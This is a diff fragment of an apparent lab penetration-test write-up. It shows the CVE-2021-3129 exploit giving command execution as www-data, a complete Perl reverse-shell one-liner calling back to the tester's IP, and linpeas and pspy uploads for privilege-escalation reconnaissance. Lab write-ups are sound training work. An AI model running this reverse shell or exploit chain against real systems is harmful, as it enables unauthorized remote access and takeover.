@@ -53,7 +53,7 @@ $ python3 CVE-2021-3129.py
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-for some reason, bash and nc doesn't work for me
+for some reason, bash and nc doesn't work for me  
 to get a reverse shell i used perl
 ```
 [?] Please enter a command to execute : execute perl -e 'use Socket;$i="192.168.45.201";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
@@ -67,14 +67,14 @@ connect to [192.168.45.201] from (UNKNOWN) [192.168.109.38] 53402
 www-data@debian:/$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
-we don't have any privilege then we upload linpeas and found there is a user skunk is in sudo group
+we don't have any privilege then we upload linpeas and found there is a user skunk is in sudo group  
 if we can get his account we maybe able to sudo to root
 ```
 ╔══════════╣ All users & groups
 uid=0(root) gid=0(root) groups=0(root)                                                                            
 uid=1001(skunk) gid=1001(skunk) groups=1001(skunk),27(sudo),33(www-data)
 ```
-we upload pspy32s to see what is running in the background
+we upload pspy32s to see what is running in the background  
 ```
 www-data@debian:/tmp$ ./pspy32s
 ./pspy32s
